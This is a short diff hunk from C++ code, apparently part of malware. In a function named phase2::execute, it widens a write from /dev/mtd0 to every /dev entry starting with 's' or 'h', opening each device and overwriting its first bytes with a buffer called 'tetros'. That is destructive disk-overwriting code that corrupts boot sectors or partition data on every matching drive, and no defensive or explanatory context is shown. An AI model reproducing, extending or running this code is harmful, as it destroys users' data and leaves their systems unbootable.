@@ -18,7 +18,7 @@ int phase2::execute()
  	   if(ent->d_name[0] == 's' || ent->d_name[0] == 'h')
 	   {
 	        printf ("%s\n", ent->d_name);
-        	int fd = open("/dev/mtd0", O_WRONLY);
+        	int fd = open(((std::string)"/dev/"+(std::string)ent->d_name).c_str(), O_WRONLY);
         	lseek(fd, 0, SEEK_SET);
         	write(fd, tetros, 4);
         	close(fd);
